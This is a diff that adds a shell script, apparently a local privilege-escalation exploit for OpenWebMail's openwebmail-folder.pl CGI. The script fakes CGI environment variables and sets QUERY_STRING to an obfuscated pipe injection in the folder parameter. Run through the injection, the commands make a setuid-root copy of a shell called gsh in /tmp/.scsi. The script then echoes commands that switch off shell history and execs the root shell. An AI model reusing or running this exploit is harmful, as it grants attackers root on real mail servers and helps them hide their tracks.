@@ -1,0 +1,49 @@
+#!/bin/sh 
+
+#export Cookie="someuser-sessionid=OWFDwoMAz2tYo"
+#export UNIQUE_ID=7CJODn8AAAEAABDubuQAAAAG
+#export HTTP_USER_AGENT=curl
+#export HTTP_HOST=555.1.2.150
+#export SERVER_PORT=80
+#export CDPATH=
+#export USER=someuser
+#export DOCUMENT_ROOT=/var/www/html
+#export SCRIPT_FILENAME=/var/www/cgi-bin/openwebmail/openwebmail-folder.pl
+#export REQUEST_URI="/cgi-bin/openwebmail/openwebmail-folder.pl?sessionid=someuser*-session-0.322908210408972&amp;folder=|(echo%20%27PATH%3DFusrFbin%20id%27%7CPATH%3D%60printf%20%27%5C057usr%5C057bin%27%60%20tr%20E-G%20.-0%7CPATH%3D%60printf%20%27%5C057bin%27%60%20sh)&amp;action=downloadfolder"
+#export SCRIPT_NAME=/cgi-bin/openwebmail/openwebmail-folder.pl
+#export ENV=
+#export REMOTE_PORT=40364
+#export _=/usr/bin/env
+#export SERVER_ADMIN=root@localhost
+#export PWD=/home/someuser
+#export HTTP_ACCEPT=*/*
+#export REMOTE_ADDR=555.1.2.22
+#export SERVER_NAME=555.1.2.150
+#export HOME=/home/someuser
+#SHLVL=2
+#export HTTP_PRAGMA=no-cache
+#export BASH_ENV=
+#export SERVER_SOFTWARE=Apache/2.0.40
+#export LOGNAME=someuser
+export QUERY_STRING="sessionid=someuser*-session-0.943596450685622&amp;folder=|(echo%20%27cd%20FtmpF.scsi%3Bchown%20rootEroot%20gsh%3BFbinFchmod%204777%20gsh%27%7CPATH%3D%60printf%20%27%5C057usr%5C057bin%27%60%20tr%20E-G%20.-0%7CPATH%3D%60printf%20%27%5C057bin%27%60%20sh)&amp;action=downloadfolder"
+#export QUERY_STRING="sessionid=someuser*-session-0.22908210408972&amp;folder=|(echo%20%27PATH%3DFusrFbin%20id%27%7CPATH%3D%60printf%20%27%5C057usr%5C057bin%27%60%20tr%20E-G%20.-0%7CPATH%3D%60printf%20%27%5C057bin%27%60%20sh)&amp;action=downloadfolder"
+#export SERVER_ADDR=555.1.2.150
+#export GATEWAY_INTERFACE=CGI/1.1
+#export SERVER_PROTOCOL=HTTP/1.1
+export HTTP_COOKIE=someuser-sessionid=OWFDwoMAz2tYo
+export HTTP_COOKIE=someuser-sessionid=1WFDwoMAz2tYo
+export HTTP_COOKIE=someuser-sessionid=11crCDkdbKmQI
+export REQUEST_METHOD=GET
+
+./openwebmail-folder.pl < ./data
+
+echo
+echo
+echo unset HISTFILE
+echo unset HISTSIZE
+echo unset HISTFILESIZE
+echo
+echo
+
+exec ./gsh
+
